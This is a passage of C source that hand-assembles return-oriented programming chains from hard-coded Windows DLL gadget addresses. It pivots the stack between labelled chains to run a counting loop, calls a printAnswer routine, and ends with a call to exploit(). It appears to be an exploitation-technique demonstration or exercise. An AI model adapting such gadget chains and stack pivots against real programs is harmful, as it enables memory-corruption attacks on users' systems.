							"\x00\x00\x00\x00"								// 0x00000000 - imm 
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret		(can replace with unique ret to set a breakpoint at in a debugger)
							
							"\xAB\x9B\x92\x7C"								// 0x7C929BAB - pop esp; ret;
							"\xC4\xFB\x12\x00"								// 0x0012FBC4 - &labelB
							;

	///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

	char labelD[] =			// i-- then jump to A
							// i = i - 1
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xAC\x31\x40\x00"								// 0x004031AC - &i
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x18\x9F\xC5\x77"								// 0x77C59F18 - dec eax; ret;
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
							"\xAC\x31\x40\x00"								// 0x004031AC - &i
							"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm 
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret		(can replace with unique ret to set a breakpoint at in a debugger)
							
							"\xAB\x9B\x92\x7C"								// 0x7C929BAB - pop esp; ret;
							"\x04\xFA\x12\x00"								// 0x0012FA04 - &labelA
							;


	///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

	char labelF[] =			// Print answer
							"\x50\x10\x40\x00"								// 0x00401050 - &printAnswer	
							;



	/*
	printf("Address of newerStack[0] = %p\n", &newerStack[0]);
	printf("Address of labelA[0] = %p\n", &labelA[0]);
	printf("Address of labelB[0] = %p\n", &labelB[0]);
	printf("Address of labelC[0] = %p\n", &labelC[0]);
	printf("Address of labelD[0] = %p\n", &labelD[0]);
	printf("Address of labelE[0] = %p\n", &labelE[0]);
	printf("Address of labelF[0] = %p\n", &labelF[0]);
	printf("Address of labelG[0] = %p\n", &labelG[0]);
	printf("Address of labelH[0] = %p\n", &labelH[0]);
	*/

	exploit();
	return 0;
}